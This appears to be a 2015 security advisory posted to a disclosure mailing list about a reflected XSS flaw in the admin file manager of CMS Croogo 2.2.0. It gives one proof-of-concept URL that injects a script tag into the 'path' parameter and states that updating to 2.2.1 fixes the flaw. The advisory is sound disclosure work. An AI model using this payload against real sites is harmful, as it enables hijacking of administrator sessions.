Subject: [FD] Reflecting XSS vulnerability in CMS Croogo v.2.2.0

Advisory: Reflecting XSS vulnerability in CMS Croogo v.2.2.0
Advisory ID: SROEADV-2015-02
Author: Steffen Rösemann
Affected Software: CMS Croogo v.2.20
Vendor URL: https://croogo.org
Vendor Status: solved
CVE-ID: -

==========================
Vulnerability Description:
==========================

The filemanager functionality in the administrative backend of CMS Croogo
v. 2.2.0 is prone to reflecting XSS attacks.

==================
Technical Details:
==================

The filemanager of a common Croogo installation is located here:

http://
{TARGET}/admin/file_manager/file_manager/editfile?path=%2FApplications%2FXAMPP%2Fxamppfiles%2Fhtdocs%2Fcroogo-2.2.0%2Fpackage.json

By appending arbitrary HTML- and/or JavaScriptcode to existing filenames,
it gets rendered in the generated webpage. It seems not to be working by
appending code to existing directory names.

Exploit-Example:

http://{TARGET}/admin/file_manager/file_manager/editfile?path=%2FApplications%2FXAMPP%2Fxamppfiles%2Fhtdocs%2Fcroogo-2.2.0%2Fpackage.json<script>alert("XSS
in filemanager functionality of CMS Croogo 2.2.0")</script><!--

=========
Solution:
=========

Update to Croogo v.2.2.1.
